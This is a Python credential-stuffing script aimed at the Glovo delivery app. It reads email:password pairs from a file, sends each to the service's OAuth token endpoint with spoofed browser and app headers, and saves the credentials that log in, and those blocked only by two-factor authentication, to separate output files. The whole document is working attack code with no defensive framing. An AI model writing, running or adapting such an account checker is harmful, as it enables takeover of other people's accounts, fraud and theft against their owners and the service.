import requests
import json

def authenticate(email, password):
    headers = {
        "Accept": "application/json",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Content-Type": "application/json",
        "Glovo-Api-Version": "14",
        "Glovo-App-Development-State": "Production",
        "Glovo-App-Platform": "web",
        "Glovo-App-Type": "customer",
        "Glovo-App-Version": "7",
        "Glovo-Device-Id": "1454407847",
        "Glovo-Language-Code": "en",
        "Origin": "https://glovoapp.com",
        "Referer": "https://glovoapp.com",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 OPR/102.0.0.0"
    }

    data = {
        "grantType": "password",
        "username": email,
        "password": password
    }

    url = "https://api.glovoapp.com/oauth/token"

    r = requests.post(url=url, headers=headers, json=data)

    try:
        response_data = r.json()
        if "statusCode" in response_data:
            if response_data["statusCode"] == 200:
                access_token = response_data.get("access")
                if access_token:
                    return "Working Account", email, password
            elif response_data["statusCode"] == 401 and response_data.get("errorCode") == "invalid_token":
                return "Invalid Credentials", email, password
            elif response_data["statusCode"] == 404 and response_data.get("errorCode") == "not_found":
                return "Invalid User Type", email, password
            else:
                return "Unhandled Error", email, password
        elif "twoFactor" in response_data:
            two_factor_data = response_data["twoFactor"]
            two_factor_token = two_factor_data.get("twoFactorToken")
            if two_factor_token:
                return "Two-Factor Auth Required", email, password
        else:
            return "Unexpected Response Format", email, password
    except json.JSONDecodeError:
        return "JSON Decode Error", email, password
    except Exception as e:
        return "An Error Occurred: " + str(e), email, password

working_accounts = []
two_factor_accounts = []
other_errors = []

with open('accounts.txt', 'r') as file:
    for line in file:
        email, password = line.strip().split(':')
        result, email, password = authenticate(email, password)
        if result == "Working Account":
            working_accounts.append(f"{email}:{password}")
        elif result == "Two-Factor Auth Required":
            two_factor_accounts.append(f"{email}:{password}")
        else:
            other_errors.append(f"{result} for {email}:{password}")
with open('working_accounts.txt', 'w') as file:
    file.write('\n'.join(working_accounts))

with open('two_factor_accounts.txt', 'w') as file:
    file.write('\n'.join(two_factor_accounts))

with open('other_errors.txt', 'w') as file:
    file.write('\n'.join(other_errors))